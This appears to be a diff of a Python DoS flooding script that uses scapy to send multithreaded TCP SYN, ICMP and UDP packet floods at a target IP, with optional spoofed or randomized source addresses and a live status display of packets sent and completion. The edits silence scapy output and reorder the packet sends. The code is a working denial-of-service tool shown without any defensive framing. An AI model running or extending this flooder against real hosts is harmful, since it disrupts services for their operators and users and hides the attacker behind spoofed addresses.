@@ -41,16 +41,21 @@ if __name__ == "__main__":
 
 rno = [True] * threadcount; rcount = [0] * threadcount 
 
-from scapy.all import IP, TCP, ICMP, UDP, send, fuzz, Raw 
+from scapy.all import IP, TCP, ICMP, UDP, send, fuzz, Raw, conf 
+
+conf.verb = 0; conf.resolve = False 
+
+conf.route_autoload = False 
+conf.route6_autoload = False 
 
 if randIp == "n":
 	def scr(number):
 		try: 
-			packetT = IP(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) / Raw(load=data) 
 			packetI = IP(dst=target_ip, src=srcIp) / ICMP() / Raw(load=data) 
+			packetT = IP(dst=target_ip, src=srcIp) / fuzz(TCP(flags='S')) / Raw(load=data) 
 			packetU = IP(dst=target_ip, src=srcIp) / fuzz(UDP()) / Raw(load=data) 
 			for i in range(count):
-				send(packetT, verbose=0); send(packetI, verbose=0); send(packetU, verbose=0) 
+				send(packetI, verbose=0); send(packetT, verbose=0); send(packetU, verbose=0) 
 				rcount[number] += 1 
 		except Exception: 0 
 		rno[number] = False 
@@ -96,7 +101,7 @@ f"\nTarget IP: {target_ip}   \t\tCurrent ping: {str(search(r"time\s*([<]?\s*\d+(
 		status_lines.append(f"'Source' IP: {srcIp if randIp == "n" else "Randomized "}    \t\tTotal estimated packets: {rcount[int(len(rcount)/2+0.9)]*3*threadcount}") 
 		if hideThreads == "y": status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s\t\t\tTotal threads: {threadcount}") 
 		else: status_lines.append(f"Time: {int((elt-(elt%(60**2)))/(60*60))}h {int((elt-(elt%60))/60)}min {elt%60}s") 
-		status_lines.append(f"Completion: {str(search(r"\d+[\.,](?:\d\d\d|\d\d|\d)", str((rcount[int(len(rcount)/2+0.9)]/count)*100)).group(0))}%\t\t\tData: {str(data).removeprefix("b")if not args.data else f"'{args.data}'"}") 
+		status_lines.append(f"Completion: {str(search(r"\d+[\.,](?:\d\d\d|\d\d|\d)", str((rcount[int(len(rcount)/2+0.9)]/count)*100)).group(0))}%\t\t\tData: {"HI! :3 " if not args.data else f"'{args.data}'"}") 
 		print("\n".join(status_lines)) 
 		sleep(0.1)
 	except Exception: 0 
